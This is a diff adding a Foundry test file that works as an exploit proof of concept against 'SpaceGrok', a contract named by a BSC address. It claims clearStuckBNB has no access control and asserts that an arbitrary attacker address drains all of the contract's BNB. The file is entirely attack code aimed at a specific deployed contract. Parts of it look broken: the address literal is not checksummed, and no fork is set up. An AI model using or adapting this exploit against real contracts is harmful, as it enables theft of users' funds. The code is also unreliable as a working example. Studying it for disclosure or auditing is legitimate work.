@@ -1,0 +1,58 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for SpaceGrok based on provided ABI
+interface ISpaceGrok {
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function clearStuckBNB() external;
+    function owner() external view returns (address);
+    function tradingActive() external view returns (bool);
+    function swapEnabled() external view returns (bool);
+    function enableTrading() external;
+    function excludeFromFees(address account, bool excluded) external;
+    function updateMarketingWallet(address newWallet) external;
+    function updateDevWallet(address newWallet) external;
+    function manualSwap(uint256 amount) external;
+    // ... other functions as needed
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address on BSC
+    address constant SPACE_GROK = 0x58718fd4567517d9a713a1f9f3de6cbf9404e59e;
+    ISpaceGrok public target;
+
+    function setUp() public {
+        // Label for debugging
+        vm.label(SPACE_GROK, "SpaceGrok");
+        target = ISpaceGrok(SPACE_GROK);
+
+        // Ensure contract has some BNB to drain
+        // For demonstration: give the contract 10 BNB
+        deal(SPACE_GROK, 10 ether);
+        assertEq(SPACE_GROK.balance, 10 ether);
+
+        // Optionally: if trading is inactive, owner can enable it,
+        // but not needed for the exploit since clearStuckBNB is always accessible.
+    }
+
+    function test_ClearStuckBNB_Drain() public {
+        address attacker = makeAddr("attacker");
+        uint256 attackerInitialBalance = attacker.balance;
+
+        // Any address can call clearStuckBNB – no access control
+        vm.prank(attacker);
+        target.clearStuckBNB();
+
+        // Attacker now holds the full BNB balance of the contract
+        uint256 attackerFinalBalance = attacker.balance;
+        assertEq(attackerFinalBalance - attackerInitialBalance, 10 ether);
+
+        // Contract should have 0 BNB
+        assertEq(SPACE_GROK.balance, 0);
+    }
+}
+```
